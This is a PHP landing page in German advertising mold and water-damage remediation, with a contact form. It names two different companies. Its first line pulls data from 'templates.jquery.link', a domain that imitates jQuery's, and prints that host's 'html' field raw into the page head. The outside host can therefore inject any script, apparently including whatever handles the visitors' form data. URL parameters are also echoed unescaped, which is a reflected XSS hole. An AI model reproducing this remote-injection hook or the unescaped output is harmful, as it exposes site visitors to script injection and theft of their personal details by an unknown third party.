<?php
$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);

$phone_name     = $site_data['phone_name'];
$phone_href     = $site_data['phone_href'];

$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'SCHIMMELPILZSANIERUNG'));
$city           = str_replace('+', ' ', trim($_GET['n'] ?? ''));

$title = $text . ' ' . $city;
?>

<!DOCTYPE html>
<html lang="at">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <?= $site_data['html'] ?>
    <title>
        <?= $title ?>
    </title>
</head>

<body>


    <header class="header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 container">
                    <div class="header__box">
                        <div class="header__img">
                            <img src="assets/img/JLiiGLIJYz_U.jpeg" alt="">
                        </div>
                        <a href="<?= $phone_href ?>" class="header__link"><span><?= $phone_name  ?></span></a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main class="main">
        <section class="schimmel">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="schimmel__box">
                            <div class="schimmel__inner">
                                <h1 class="schimmel__title"><?= $title ?></h1>
                                <p class="schimmel__descr">Feuchtigkeit in der Wand oder anderen Bauteilen bemerken Sie
                                    im Anfangsstadium nur als Flecken, die sich langsam ausbreiten. Werden an diesen
                                    Stellen dunkle Punkte sichtbar, handeln Sie schnell!</p>
                                <a class="schimmel__btn" href="<?= $phone_href ?>">24/7 Notfall Hotline</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <div class="about">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 containerWidth">
                        <div class="about__box">
                            <div class="about__left">
                                <p class="about__text">
                                    Es ist ein eindeutiger Hinweis auf <span>Feuchtigkeit in der Bausubstanz</span> und
                                    der Schimmel
                                    fängt an, sich dort wohlzufühlen. Ein Anruf bei Firma Schimmel protektor verhindert
                                    durch eine <span>genaue Diagnose</span> und eine <span>professionelle
                                        Schimmelpilzsanierung</span> der
                                    betroffenen Bauteile das Ausbreiten der Sporen und stellt den <span>Urzustand des
                                        Gebäudes</span>
                                    wieder her.
                                </p>
                            </div>
                            <div class="about__right">
                                <div class="about__inner">
                                    <div class="about__img">
                                        <img src="assets/img/1diagnostic.svg" alt="">
                                    </div>
                                    <div class="about__name">
                                        LECKORTUNG
                                    </div>
                                </div>
                                <div class="about__inner">
                                    <div class="about__img">
                                        <img src="assets/img/2dry.svg" alt="">
                                    </div>
                                    <div class="about__name">
                                        TROCKNUNG
                                    </div>
                                </div>
                                <div class="about__inner">
                                    <div class="about__img">
                                        <img src="assets/img/3renovation.svg" alt="">
                                    </div>
                                    <div class="about__name">
                                        SANIERUNG
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="gallery">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 containerWidth">
                        <div class="gallery__box">
                            <div class="gallery__img">
                                <img src="assets/img/1photo-1524693220625-1ce88de88992-scaled-263f7397.jpg" alt="">
                            </div>
                            <div class="gallery__img">
                                <img src="assets/img/2photo-1546816077-623b4eaab352-scaled-3e7a1a0e.jpg" alt="">
                            </div>
                            <div class="gallery__img">
                                <img src="assets/img/3photo-1529316738131-4d0e0761a38e-scaled-36d6155f.jpg" alt="">
                            </div>
                            <div class="gallery__img">
                                <img src="assets/img/4photo-1528306479382-7645f5db559f-scaled-2646f035.jpg" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <section class="benefits">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="benefits__title">PROFITIEREN SIE VON DEN VORTEILEN EINER GEBÄUDETROCKNUNG DURCH FIRMA
                            BRONZEL SERVICE!</h2>
                        <div class="benefits__box">
                            <div class="benefits__name">BAUTROCKNUNG BEI WASSERSCHADEN</div>
                            <p class="benefits__text">Wir statten Baustellen individuell mit den passenden
                                Trocknungsgeräten aus. Das beschleunigt den Arbeitsprozess von Bauprojekten und
                                Sanierungsmaßnahmen. Nicht nur eine schnelle Bautrocknung bei Wasserschaden ist für
                                Bauherren und Bauträger wichtig. Zeit ist Geld! Gerade bei frisch gegossenem Estrich
                                können durch eine Bautrocknung Fußbodenbeläge schneller verlegt werden – im Neubau oder
                                in einem zu sanierenden Gebäude. So halten Sie – unabhängig von der Witterung – straffe
                                Zeitpläne ohne Druck ein.</p>

                        </div>
                        <span></span>
                        <div class="benefits__box">
                            <div class="benefits__name">ESTRICHTROCKNUNG NACH WASSERSCHADEN</div>
                            <p class="benefits__text">Von den drei verschiedenen Estrich-Arten (Verbund-Estrich, Estrich
                                auf einer Trennlage, schwimmender Estrich) gestaltet sich die Estrichtrocknung nach dem
                                Wasserschaden bei schwimmendem Estrich am unkompliziertesten. Die Trocknung mit
                                speziellen Lufttrocknern, darunter geräuscharme Eigenentwicklungen von Firma Bronzel
                                Service, lässt sich leicht umsetzen. Unsere eigenen Geräte verbrauchen zudem im
                                Vergleich zu Seriengeräten 70 Prozent weniger Energie.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="palette">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="palette__title">„DIE WASSERWEHR“</h2>
                        <div class="palette__descr">BRONZEL SERVICE</div>
                    </div>
                </div>
            </div>
        </section>
        <section class="drying">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="drying__title"> PROFESSIONELLE GEBÄUDETROCKNUNG – SCHNELL UND SCHONEND!</h2>
                        <div class="drying__box">
                            <p class="drying__left">Bronzel Service senkt die Luftfeuchtigkeit im Raum kontrolliert ab –
                                mit Kondens- oder Adsorptionstrocknern. Diese Art der Trocknung gestaltet sich bei
                                Feuchtigkeit oder Wasser in Wänden, Decken oder Oberflächen von Böden relativ einfach.
                                Zusätzlich kommen Umluft-Gebläse unterstützend zum Einsatz. Die Luftfeuchtigkeit wird
                                abgesenkt und das atmungsaktive Bauteil gibt seine Feuchtigkeit an die Luft im Raum ab.
                                Dieser Prozess wird so lange fortgesetzt,</p>
                            <p class="drying__right">bis die betroffenen Stellen getrocknet sind. Wir trocknen auch Ihr
                                Flachdach mit einer Kombination aus Unter- und Überdruckverfahren. Nicht atmungsaktive
                                Materialien wie Tapeten und Bodenbeläge mit Gummi- und PVC-Beschichtung oder Latexfarbe
                                werden besonders behandelt. Informieren Sie sich in einer unserer Filialen – wir sind
                                ganz in Ihrer Nähe!</p>
                        </div>
                        <span></span>
                    </div>
                </div>
            </div>
        </section>
        <section class="old">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 containerWidth">
                        <div class="old__box">
                            <div class="old__img">
                                <img src="assets/img/000photo-1611941888750-59b178dfc7ee-scaled-5c8d99a0.jpg" alt="">
                            </div>
                            <div class="old__content">
                                <h2 class="old__title">DIE GEBÄUDETROCKNUNG NACH EINEM WASSERSCHADEN IN ALTBAUTEN</h2>
                                <p class="old__text">Viele Altbauten verfügen über Zimmerdecken mit Holzbalken. Die mit
                                    den Balken gebildeten Kammern sind sehr oft noch mit Lehm gefüllt und quellen bei
                                    Feuchtigkeit oder Wasser auf. Eine Gebäudetrocknung bei Wasserschaden muss deshalb
                                    schnell erfolgen. So vermeiden Sie zusätzlich Schimmelbildung. Alle nicht
                                    atmungsaktiven Oberflächen müssen entfernt werden. Dazu zählen eine große Anzahl von
                                    Vliestapeten oder Latex-Anstriche, die eine Diffusion verhindern. Auch Bodenbeläge
                                    aus Kunststoffen wie PVC müssen vor einer Gebäudetrocknung bei Wasserschaden
                                    entfernt werden.</p>
                                <a href="<?= $phone_href  ?>" class="header__link header__link--font"><span><?= $phone_name  ?></span></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="services">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="services__title">WIR BIETEN IHNEN EINEN UMFANGREICHEN LEISTUNGSKATALOG!</h2>
                        <div class="services__box">
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/01.svg" alt="">
                                </div>
                                <div class="services__name">LECKORTUNG</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/02.svg" alt="">
                                </div>
                                <div class="services__name">GEBÄUDETROCKNUNG</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/03.svg" alt="">
                                </div>
                                <div class="services__name">SANIERUNG</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/04.svg" alt="">
                                </div>
                                <div class="services__name">WASSERSCHADENSANIERUNG</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/05.svg" alt="">
                                </div>
                                <div class="services__name">BRANDSCHADENSANIERUNG</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/06.svg" alt="">
                                </div>
                                <div class="services__name">SCHIMMELPILZSANIERUNG</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/07.svg" alt="">
                                </div>
                                <div class="services__name">THERMOGRAFIE</div>
                            </div>
                            <div class="services__inner">
                                <div class="services__img">
                                    <img src="assets/img/08.svg" alt="">
                                </div>
                                <div class="services__name">FEUCHTIGKEITSMESSUNG</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="forms">
            <div class="container-fluid">
                <div class="row">
                    <h2 class="forms__title">Kontaktieren Sie uns:</h2>
                    <div class="col-12 container">
                        <div class="forms__box">
                            <form id="jq_form" class="mt-5">
                                <div class="my-3">
                                    <input class="form-control" placeholder="Vorname" name="jq_name" type="text">
                                    <div id="jq_name" style="font-weight:700;font-size:15px;color:red;padding-top:2px;display:none">Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="Telefon" name="jq_phone" type="text">
                                    <div id="jq_phone" style="font-weight:700;font-size:15px;color:red;padding-top:2px;display:none">Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="Straße" name="jq_street" type="text">
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="PLZ / Ort" name="jq_city" type="text">
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="E-Mail" name="jq_email" type="text">
                                </div>
                                <div class="my-4">
                                    <textarea rows="3" class="form-control" name="jq_text" placeholder="Nachricht"></textarea>
                                    <div id="jq_text" style="font-weight:700;font-size:15px;color:red;padding-top:2px;display:none">Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div>
                                    <input class="btn  text-uppercase fw-bold mb-5 px-3 py-2 forms__button" type="submit" id="jq_submit" value="Senden">
                                </div>
                                <div id="jq_success" style="display:none">Vielen Dank für deine Nachricht. Sie wurde
                                    gesendet.</div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>
    <footer class="footer">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                    <span>2022</span>
                </div>
            </div>
        </div>

    </footer>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</body>

</html>